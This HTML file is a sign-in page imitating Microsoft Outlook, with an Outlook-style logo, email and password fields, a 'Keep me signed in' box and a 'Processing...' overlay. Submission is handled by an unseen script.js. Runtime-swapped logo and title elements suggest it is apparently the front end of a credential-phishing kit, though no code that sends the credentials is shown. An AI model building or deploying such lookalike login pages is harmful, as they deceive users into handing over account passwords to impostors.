<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In to Outlook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <!-- Microsoft/Outlook-style logo -->
            <img id="dynamic-logo" src="https://via.placeholder.com/100" alt="Microsoft Logo" class="logo">
        </header>
        <main>
            <h1 id="dynamic-title">Sign in to your Outlook account</h1>
            <form class="login-form" id="loginForm">
                <label for="user-email">Email, phone, or Skype</label>
                <input type="email" id="user-email" placeholder="Email, phone, or Skype" required>

                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Password" required>

                <div class="remember-me">
                    <input type="checkbox" id="remember-me">
                    <label for="remember-me">Keep me signed in</label>
                </div>

                <button type="submit" class="login-button">Next</button>
            </form>
            <div class="links">
                <a href="#">Can't access your account?</a>
            </div>
            <div class="help">
                <p>Sign in with your work or school account</p>
                <a href="#">Learn more</a>
            </div>
        </main>
    </div>

    <div class="overlay" id="overlay">
        <div>
            <div class="spinner"></div>
            <p>Processing...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
